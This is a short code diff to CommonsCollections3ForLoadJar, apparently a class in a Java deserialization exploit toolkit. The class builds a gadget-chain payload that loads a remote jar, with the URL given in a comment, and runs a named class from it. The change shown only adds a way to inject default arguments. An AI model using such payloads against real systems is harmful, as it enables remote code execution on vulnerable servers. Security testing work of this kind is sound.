@@ -23,6 +23,8 @@ import org.apache.commons.collections.map.LazyMap;
  */
 public class CommonsCollections3ForLoadJar implements Payload {
 
+  private String[] args;
+
   public static boolean isApplicableJavaVersion() {
     return JavaVersion.isAnnInvHUniversalMethodImpl();
   }
@@ -39,6 +41,8 @@ public class CommonsCollections3ForLoadJar implements Payload {
    */
   @Override
   public Object getPayload(String[] args) throws Exception {
+    if (this.args != null)
+      args = this.args;
     // http://127.0.0.1:8080/R.jar Cmd
     String payloadUrl = args[0];
     String className = args[1];
@@ -83,4 +87,10 @@ public class CommonsCollections3ForLoadJar implements Payload {
 
     return handler;
   }
+
+  @Override
+  public void injectDefaultArgs(String[] args) {
+    this.args = args;
+  }
+
 }
